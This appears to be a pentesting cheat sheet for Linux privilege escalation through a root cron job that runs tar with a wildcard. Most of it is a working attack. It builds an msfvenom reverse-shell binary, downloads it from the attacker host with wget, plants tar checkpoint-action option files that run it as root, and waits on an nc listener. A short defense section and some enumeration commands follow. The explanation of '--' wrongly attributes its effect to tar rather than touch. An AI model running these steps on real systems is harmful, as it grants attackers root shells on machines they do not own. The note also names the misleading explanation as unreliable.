------------------------------------------------------------
# Linux Privilege Escalation - Crontab & Wildcard Exploits
------------------------------------------------------------

## Requirements
All 3 must be true:
1. Cron runs as root: `cat /etc/crontab`
2. Command uses `*`: `tar cf backup.tar *`
3. You can write to the directory: `ls -ld /home/user`

## Exploitation Steps
--------------------------------
### 1. Create Reverse Shell
---------------------------------
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.114.112.67 LPORT=4444 -f elf -o shell.elf

-----------------------------------
### 2. Upload and Make Executable
-----------------------------------
python3 -m http.server 8000  # on attacker machine
wget http://10.114.112.67:8000/shell.elf  # on target
chmod +x shell.elf
-----------------------------------
### 3. Create the Exploit Files
------------------------------------
The `--` tells `tar` to treat these as options, not filenames.
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=shell.elf
-------------------------
### 4. Listen and Wait
-------------------------
nc -lvnp 4444
Within 1 minute, cron will run and execute your shell as root.


## Defense
1. Never use `*` in cron jobs. Specify files explicitly.
2. Use full paths: `/usr/bin/tar` instead of `tar`
3. Don't run cron jobs in world-writable directories


## Useful Commands for Enumeration
cat /etc/crontab
crontab -u root -l
grep -R "*" /etc/cron*
find / -writable -type d 2>/dev/null | grep -v /proc
*Summary:* root cron + command with `*` + writable directory = root
